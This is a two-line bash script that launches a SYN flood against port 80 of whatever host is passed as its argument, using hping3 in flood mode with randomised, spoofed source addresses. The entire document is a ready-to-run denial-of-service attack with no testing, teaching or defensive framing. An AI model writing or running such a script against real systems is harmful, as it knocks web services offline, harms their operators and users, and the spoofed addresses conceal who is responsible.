#!/bin/bash
hping3 --flood -S -V --rand-source -p 80 $1
